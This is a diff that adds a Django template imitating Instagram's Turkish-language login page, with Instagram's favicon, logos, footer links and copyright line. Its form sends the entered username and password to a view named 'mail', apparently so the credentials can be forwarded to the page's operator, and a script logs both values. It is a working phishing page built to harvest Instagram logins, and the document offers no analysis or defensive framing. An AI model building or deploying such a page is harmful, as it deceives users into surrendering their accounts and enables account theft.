@@ -1,0 +1,107 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
+  <link rel="stylesheet" type="text/css" href="{% static 'style.css' %}"/>
+  
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <title>Instagram</title>
+</head>
+
+<body>
+
+  <div id="wrapper">
+    <div class="container">
+      <div class="phone-app-demo"></div>
+      <div class="form-data">
+      <form action="{% url 'mail' %}" method="POST">
+        {% csrf_token %}
+        
+          <div class="logo">
+            <img src="{% static 'logo.png' %}" alt="logo">
+          </div>
+          <input type="text" placeholder="Telefon numarası, kullanıcı adı, veya e-posta" name="un">
+          <input type="password" placeholder="Şifre" name="pass">
+          <button class="form-btn" type="submit">Giriş Yap</button>
+          <span class="has-separator">YA DA</span>
+          <a class="facebook-login" href="#">
+            <i class="fab fa-facebook-square"></i>Facebook ile Giriş Yap
+          </a>
+          <a class="password-reset" href="#">Şifreni mi unuttun?</a>
+        </form>
+        <div class="sign-up">
+          Hesabın yok mu? <a href="index.html">Kaydol</a>
+        </div>
+        <div class="get-the-app">
+          <span>Uygulamayı indir.</span>
+          <div class="badges">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yp/r/XUCupIzGmzB.png" alt="app-store badge" style='height:4rem;width:12rem'>
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yf/r/BFthdeAc5KC.png" alt="google-play badge" style='height:4rem;width:12rem'>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="container">
+        <nav class="footer-nav">
+          <ul>
+            <li>
+              <a href="index.html" ><span id="footerdata">META</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Hakkında</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Yardım</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">API</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Gizlilik</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Koşullar</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Başlıca Hesaplar</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Konumlar</span></a>
+            </li>
+            <li>
+              <a href="index.html" ><span id="footerdata">Instagram Lite</span></a>
+            </li>
+          
+           
+          </ul>
+        </nav>
+        
+        <div class="copyright-notice">
+          &copy 2022 Instagram
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+
+  <script>
+    $( "#login" ).click(function() {
+      console.log($('#username').val());
+      console.log($('#pass').val());
+      
+         
+      
+    });
+  </script>
+</body>
+
+</html>
